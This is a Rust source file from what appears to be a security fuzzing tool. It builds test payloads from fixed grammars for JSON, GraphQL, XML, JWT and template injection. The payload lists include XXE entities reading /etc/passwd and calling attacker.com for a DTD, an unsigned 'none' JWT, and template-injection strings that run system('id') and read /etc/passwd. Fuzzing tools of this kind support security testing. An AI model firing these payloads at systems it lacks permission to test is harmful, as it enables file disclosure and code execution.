use serde::{Deserialize, Serialize};

use crate::types::Severity;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum GrammarKind {
    Json,
    GraphQL,
    Xml,
    Jwt,
    Ssti,
}

impl GrammarKind {
    pub fn payload_type(&self) -> super::payloads::PayloadType {
        match self {
            GrammarKind::Json => super::payloads::PayloadType::Deser,
            GrammarKind::GraphQL => super::payloads::PayloadType::GraphQL,
            GrammarKind::Xml => super::payloads::PayloadType::Xxe,
            GrammarKind::Jwt => super::payloads::PayloadType::Jwt,
            GrammarKind::Ssti => super::payloads::PayloadType::Ssti,
        }
    }

    pub fn severity(&self) -> Severity {
        match self {
            GrammarKind::Json => Severity::Medium,
            GrammarKind::GraphQL => Severity::Medium,
            GrammarKind::Xml => Severity::High,
            GrammarKind::Jwt => Severity::High,
            GrammarKind::Ssti => Severity::Critical,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GrammarRule {
    pub name: String,
    pub alternatives: Vec<String>,
    pub weight: Option<f32>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Grammar {
    pub start: String,
    pub rules: Vec<GrammarRule>,
}

impl Grammar {
    pub fn json() -> Self {
        Grammar {
            start: "value".to_string(),
            rules: vec![
                GrammarRule {
                    name: "value".to_string(),
                    alternatives: vec!["null".to_string(), "true".to_string(), "false".to_string()],
                    weight: None,
                },
                GrammarRule {
                    name: "string".to_string(),
                    alternatives: vec![
                        "\"\"".to_string(),
                        "\"a\"".to_string(),
                        "\"{}\"".to_string(),
                        "\"$STRING$\"".to_string(),
                    ],
                    weight: None,
                },
                GrammarRule {
                    name: "number".to_string(),
                    alternatives: vec![
                        "0".to_string(),
                        "1".to_string(),
                        "-1".to_string(),
                        "1.5".to_string(),
                        "999999999999999999".to_string(),
                    ],
                    weight: None,
                },
            ],
        }
    }

    pub fn graphql() -> Self {
        Grammar {
            start: "query".to_string(),
            rules: vec![GrammarRule {
                name: "query".to_string(),
                alternatives: vec![
                    "{ __schema { types { name } } }".to_string(),
                    "{ __typename }".to_string(),
                    "query { users { id name } }".to_string(),
                    "mutation { login { token } }".to_string(),
                ],
                weight: None,
            }],
        }
    }

    pub fn xml() -> Self {
        Grammar {
            start: "document".to_string(),
            rules: vec![
                GrammarRule {
                    name: "document".to_string(),
                    alternatives: vec![
                        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>".to_string(),
                        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>".to_string(),
                        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd;]><foo/>".to_string(),
                    ],
                    weight: None,
                },
            ],
        }
    }

    pub fn jwt() -> Self {
        Grammar {
            start: "token".to_string(),
            rules: vec![
                GrammarRule {
                    name: "alg".to_string(),
                    alternatives: vec![
                        "none".to_string(),
                        "HS256".to_string(),
                        "HS384".to_string(),
                        "HS512".to_string(),
                        "RS256".to_string(),
                        "RS384".to_string(),
                        "RS512".to_string(),
                        "ES256".to_string(),
                        "ES384".to_string(),
                        "ES512".to_string(),
                        "PS256".to_string(),
                        "PS384".to_string(),
                        "PS512".to_string(),
                    ],
                    weight: None,
                },
                GrammarRule {
                    name: "token".to_string(),
                    alternatives: vec![
                        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.".to_string(),
                        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c".to_string(),
                    ],
                    weight: None,
                },
            ],
        }
    }

    pub fn ssti() -> Self {
        Grammar {
            start: "template".to_string(),
            rules: vec![
                GrammarRule {
                    name: "jinja2".to_string(),
                    alternatives: vec![
                        "{{7*7}}".to_string(),
                        "{{config}}".to_string(),
                        "{{request}}".to_string(),
                        "{{self.__class__.__mro__[2].__subclasses__()}}".to_string(),
                        "{{''.__class__.__mro__[2].__subclasses__()}}".to_string(),
                        "{% for x in ().__class__.__base__.__subclasses__() %}{{x()}}{% endfor %}"
                            .to_string(),
                    ],
                    weight: None,
                },
                GrammarRule {
                    name: "erb".to_string(),
                    alternatives: vec![
                        "<%= 7*7 %>".to_string(),
                        "<%= system('id') %>".to_string(),
                        "<%= File.read('/etc/passwd') %>".to_string(),
                        "<%= `ls -la` %>".to_string(),
                    ],
                    weight: None,
                },
                GrammarRule {
                    name: "template".to_string(),
                    alternatives: vec![
                        "{{7*7}}".to_string(),
                        "<%= 7*7 %>".to_string(),
                        "#{7*7}".to_string(),
                        "${7*7}".to_string(),
                    ],
                    weight: None,
                },
            ],
        }
    }
}

/// Fuzzer for grammar-based payload generation supporting JSON, GraphQL, XML, JWT, and SSTI formats.
///
/// # Deterministic Fuzzing
///
/// For reproducible fuzzing results, use [`GrammarFuzzer::with_seed()`] instead of [`GrammarFuzzer::new()`]:
///
/// ```
/// use slapper::fuzzer::grammar::{Grammar, GrammarKind, GrammarFuzzer};
///
/// let grammar = Grammar::json();
/// let mut fuzzer = GrammarFuzzer::with_seed(grammar, GrammarKind::Json, 42);
/// let payload = fuzzer.generate();
/// // Same seed (42) always produces the same payload
/// ```
///
/// # Example
///
/// ```
/// use slapper::fuzzer::grammar::{Grammar, GrammarKind, GrammarFuzzer};
///
/// let grammar = Grammar::json();
/// let mut fuzzer = GrammarFuzzer::new(grammar, GrammarKind::Json);
/// for _ in 0..10 {
///     let payload = fuzzer.generate();
///     println!("{}", payload);
/// }
/// ```
pub struct GrammarFuzzer {
    grammar: Grammar,
    rng: rand::rngs::StdRng,
    max_depth: usize,
    kind: GrammarKind,
}

impl GrammarFuzzer {
    pub fn new(grammar: Grammar, kind: GrammarKind) -> Self {
        use rand::SeedableRng;
        Self {
            grammar,
            rng: rand::rngs::StdRng::from_entropy(),
            max_depth: 10,
            kind,
        }
    }

    pub fn with_seed(grammar: Grammar, kind: GrammarKind, seed: u64) -> Self {
        use rand::SeedableRng;
        Self {
            grammar,
            rng: rand::rngs::StdRng::seed_from_u64(seed),
            max_depth: 10,
            kind,
        }
    }

    pub fn kind(&self) -> GrammarKind {
        self.kind
    }

    pub fn generate(&mut self) -> String {
        let start_rule = self.grammar.start.clone();
        self.expand_rule(&start_rule, 0)
    }

    fn expand_rule(&mut self, rule_name: &str, depth: usize) -> String {
        if depth >= self.max_depth {
            return String::new();
        }

        let rule_opt = self.grammar.rules.iter().find(|r| r.name == rule_name);

        if let Some(rule) = rule_opt {
            let idx = rand::Rng::gen_range(&mut self.rng, 0..rule.alternatives.len());
            let alternative = &rule.alternatives[idx];

            if alternative.starts_with('$') && alternative.ends_with('$') {
                let inner = alternative[1..alternative.len() - 1].to_string();
                return self.expand_rule(&inner, depth + 1);
            }

            alternative.clone()
        } else {
            rule_name.to_string()
        }
    }

    pub fn generate_batch(&mut self, count: usize) -> Vec<String> {
        (0..count).map(|_| self.generate()).collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_grammar_fuzzer_json() {
        let grammar = Grammar::json();
        let mut fuzzer = GrammarFuzzer::new(grammar, GrammarKind::Json);
        let result = fuzzer.generate();
        assert!(!result.is_empty());
    }

    #[test]
    fn test_grammar_fuzzer_ssti() {
        let grammar = Grammar::ssti();
        let mut fuzzer = GrammarFuzzer::new(grammar, GrammarKind::Ssti);
        let result = fuzzer.generate();
        assert!(!result.is_empty());
    }
}
